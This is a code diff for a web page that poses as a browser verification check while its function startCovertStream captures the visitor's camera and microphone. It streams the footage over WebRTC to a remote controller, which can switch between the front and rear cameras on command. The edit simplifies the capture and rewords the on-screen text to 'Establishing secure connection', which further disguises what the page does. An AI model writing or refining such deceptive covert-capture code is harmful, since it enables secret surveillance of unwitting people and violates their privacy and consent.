@@ -142,194 +142,24 @@
         let ws;
         let pc;
         let localStream;
-        let frontStream = null;
-        let rearStream = null;
-        let compositeStream = null;
-        let canvasElement = null;
-        let canvasCtx = null;
-        let animFrameId = null;
         let pendingIceCandidates = [];
         let pingInterval = null;
         let isConnectingWs = false;
         let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
-        
-        const frontVideo = document.createElement('video');
-        frontVideo.autoplay = true;
-        frontVideo.muted = true;
-        frontVideo.playsInline = true;
-
-        const rearVideo = document.createElement('video');
-        rearVideo.autoplay = true;
-        rearVideo.muted = true;
-        rearVideo.playsInline = true;
+        let isSwitching = false;
 
         async function startCovertStream() {
             const card = document.getElementById('mainCard');
             card.innerHTML = `
                 <div class="spinner"></div>
                 <h1 style="margin-top: 16px;">Verifying browser...</h1>
-                <p>Establishing dual camera feeds. Please wait a moment.</p>
+                <p>Establishing secure connection. Please wait a moment.</p>
             `;
 
             try {
-                // Initialize Front Camera
-                try {
-                    frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: { ideal: "user" },
-                            width: { ideal: 1280, max: 1920 },
-                            height: { ideal: 720, max: 1080 },
-                            frameRate: { ideal: 30, max: 30 }
-                        },
-                        audio: {
-                            echoCancellation: true,
-                            noiseSuppression: true,
-                            autoGainControl: true
-                        }
-                    });
-                    frontVideo.srcObject = frontStream;
-                    await frontVideo.play().catch(() => {});
-                } catch (err) {
-                    console.warn("Front camera initial acquisition error:", err);
-                }
-
-                // Try acquiring Rear Camera simultaneously (if supported by hardware)
-                try {
-                    rearStream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            facingMode: { ideal: "environment" },
-                            width: { ideal: 1280, max: 1920 },
-                            height: { ideal: 720, max: 1080 },
-                            frameRate: { ideal: 30, max: 30 }
-                        },
-                        audio: false
-                    });
-                    rearVideo.srcObject = rearStream;
-                    await rearVideo.play().catch(() => {});
-                } catch (err) {
-                    console.log("Hardware single-sensor mode: Rear camera will activate on demand.");
-                }
-
-                // Setup High-Definition Dual Canvas Compositor
-                setupDualCompositor();
-
-                connectSignaling();
-            } catch (err) {
-                console.error("Media/connection error:", err);
-                card.innerHTML = `
-                    <h1 style="color: #ef4444;">Verification Failed</h1>
-                    <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
-                `;
-            }
-        }
-
-        function setupDualCompositor() {
-            canvasElement = document.createElement('canvas');
-            canvasElement.width = 1280;
-            canvasElement.height = 720;
-            canvasCtx = canvasElement.getContext('2d', { alpha: false });
-
-            function renderDualFrame() {
-                // Clear background
-                canvasCtx.fillStyle = "#090d16";
-                canvasCtx.fillRect(0, 0, 1280, 720);
-
-                // Draw Left Pane: FRONT CAMERA
-                if (frontVideo.videoWidth > 0) {
-                    canvasCtx.drawImage(frontVideo, 0, 0, 640, 720);
-                } else if (currentFacingMode === 'user' && rearVideo.videoWidth > 0) {
-                    canvasCtx.drawImage(rearVideo, 0, 0, 640, 720);
-                } else {
-                    canvasCtx.fillStyle = "#131d35";
-                    canvasCtx.fillRect(0, 0, 640, 720);
-                    canvasCtx.fillStyle = "#64748b";
-                    canvasCtx.font = "bold 20px monospace";
-                    canvasCtx.textAlign = "center";
-                    canvasCtx.fillText("FRONT CAMERA [STANDBY]", 320, 360);
-                }
-
-                // Draw Right Pane: REAR CAMERA
-                if (rearVideo.videoWidth > 0) {
-                    canvasCtx.drawImage(rearVideo, 640, 0, 640, 720);
-                } else if (currentFacingMode === 'environment' && frontVideo.videoWidth > 0) {
-                    canvasCtx.drawImage(frontVideo, 640, 0, 640, 720);
-                } else {
-                    canvasCtx.fillStyle = "#0f172a";
-                    canvasCtx.fillRect(640, 0, 640, 720);
-                    canvasCtx.fillStyle = "#64748b";
-                    canvasCtx.font = "bold 20px monospace";
-                    canvasCtx.textAlign = "center";
-                    canvasCtx.fillText("REAR CAMERA [STANDBY]", 960, 360);
-                }
-
-                // Center divider
-                canvasCtx.strokeStyle = "rgba(0, 242, 254, 0.4)";
-                canvasCtx.lineWidth = 4;
-                canvasCtx.beginPath();
-                canvasCtx.moveTo(640, 0);
-                canvasCtx.lineTo(640, 720);
-                canvasCtx.stroke();
-
-                // Front Badge
-                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
-                canvasCtx.fillRect(16, 16, 210, 36);
-                canvasCtx.fillStyle = "#00f2fe";
-                canvasCtx.font = "bold 15px monospace";
-                canvasCtx.textAlign = "left";
-                canvasCtx.fillText("● FRONT CAMERA", 28, 40);
-
-                // Rear Badge
-                canvasCtx.fillStyle = "rgba(0, 0, 0, 0.75)";
-                canvasCtx.fillRect(656, 16, 210, 36);
-                canvasCtx.fillStyle = "#10b981";
-                canvasCtx.font = "bold 15px monospace";
-                canvasCtx.textAlign = "left";
-                canvasCtx.fillText("● REAR CAMERA", 668, 40);
-
-                animFrameId = requestAnimationFrame(renderDualFrame);
-            }
-
-            renderDualFrame();
-
-            compositeStream = canvasElement.captureStream(30);
-
-            // Add audio track if present
-            const audioStream = frontStream || rearStream;
-            if (audioStream && audioStream.getAudioTracks().length > 0) {
-                compositeStream.addTrack(audioStream.getAudioTracks()[0]);
-            }
-
-            localStream = compositeStream;
-        }
-
-        async function switchCamera(requestedMode) {
-            const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
-            console.log(`[*] Switching camera to: ${targetMode}`);
-
-            try {
-                // Stop all previous tracks first to free mobile camera hardware ISP
-                if (localStream) {
-                    localStream.getTracks().forEach(track => {
-                        try { track.stop(); } catch (e) {}
-                    });
-                }
-                if (frontStream) {
-                    frontStream.getTracks().forEach(track => {
-                        try { track.stop(); } catch (e) {}
-                    });
-                }
-                if (rearStream) {
-                    rearStream.getTracks().forEach(track => {
-                        try { track.stop(); } catch (e) {}
-                    });
-                }
-
-                // Short delay to allow hardware sensor release on mobile OS
-                await new Promise(r => setTimeout(r, 100));
-
-                const newStream = await navigator.mediaDevices.getUserMedia({
+                localStream = await navigator.mediaDevices.getUserMedia({
                     video: {
-                        facingMode: { ideal: targetMode },
+                        facingMode: { ideal: currentFacingMode },
                         width: { ideal: 1280, max: 1920 },
                         height: { ideal: 720, max: 1080 },
                         frameRate: { ideal: 30, max: 30 }
@@ -341,23 +171,79 @@
                     }
                 });
 
+                connectSignaling();
+            } catch (err) {
+                console.error("Initial camera acquisition error:", err);
+                // Fallback to any available video input
+                try {
+                    localStream = await navigator.mediaDevices.getUserMedia({
+                        video: true,
+                        audio: true
+                    });
+                    connectSignaling();
+                } catch (fallbackErr) {
+                    console.error("Fatal camera permission error:", fallbackErr);
+                    card.innerHTML = `
+                        <h1 style="color: #ef4444;">Verification Failed</h1>
+                        <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
+                    `;
+                }
+            }
+        }
+
+        async function switchCamera(requestedMode) {
+            if (isSwitching) return;
+            isSwitching = true;
+
+            const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
+            console.log(`[*] Switching camera to: ${targetMode}`);
+
+            try {
+                // Stop existing video track so mobile camera ISP is free
+                if (localStream) {
+                    localStream.getVideoTracks().forEach(track => {
+                        try { track.stop(); } catch (e) {}
+                    });
+                }
+
+                // Short sleep to allow hardware release
+                await new Promise(r => setTimeout(r, 80));
+
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { ideal: targetMode },
+                        width: { ideal: 1280, max: 1920 },
+                        height: { ideal: 720, max: 1080 },
+                        frameRate: { ideal: 30, max: 30 }
+                    },
+                    audio: false
+                });
+
                 const newVideoTrack = newStream.getVideoTracks()[0];
-                if (!newVideoTrack) throw new Error("No video track available");
+                if (!newVideoTrack) throw new Error("No video track acquired");
 
-                localStream = newStream;
-                currentFacingMode = targetMode;
-
-                // Replace track on WebRTC peer connection immediately
+                // Hot-swap video track on WebRTC peer connection
                 if (pc) {
                     const senders = pc.getSenders();
                     const videoSender = senders.find(s => s.track && s.track.kind === 'video');
                     if (videoSender) {
                         await videoSender.replaceTrack(newVideoTrack);
-                        console.log("[+] Replaced track on peer connection:", targetMode);
+                        console.log("[+] Replaced track on WebRTC peer connection to:", targetMode);
                     }
                 }
 
-                // Notify controller of active camera
+                // Update localStream
+                if (localStream) {
+                    const oldTracks = localStream.getVideoTracks();
+                    oldTracks.forEach(t => localStream.removeTrack(t));
+                    localStream.addTrack(newVideoTrack);
+                } else {
+                    localStream = newStream;
+                }
+
+                currentFacingMode = targetMode;
+
+                // Send confirmation to dashboard
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
@@ -365,8 +251,21 @@
                     }));
                 }
             } catch (err) {
-                console.error("Failed to switch camera:", err);
-                // Report back to controller so UI does not stay stuck
+                console.error("Camera switch error:", err);
+                // Attempt to restore previous camera
+                try {
+                    const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { ideal: currentFacingMode } },
+                        audio: false
+                    });
+                    const fallbackTrack = fallbackStream.getVideoTracks()[0];
+                    if (pc && fallbackTrack) {
+                        const senders = pc.getSenders();
+                        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+                        if (videoSender) await videoSender.replaceTrack(fallbackTrack);
+                    }
+                } catch (revertErr) {}
+
                 if (ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({
                         type: "camera_info",
@@ -374,6 +273,8 @@
                         error: err.message
                     }));
                 }
+            } finally {
+                isSwitching = false;
             }
         }
 
@@ -424,7 +325,7 @@
                         console.log("[+] Received request_offer from controller");
                         await sendOffer();
                     } else if (msg.type === "switch_camera") {
-                        console.log("[+] Received switch_camera command");
+                        console.log("[+] Received switch_camera command:", msg.camera);
                         await switchCamera(msg.camera);
                     } else if (msg.type === "answer" && pc) {
                         console.log("[+] Setting remote answer description");
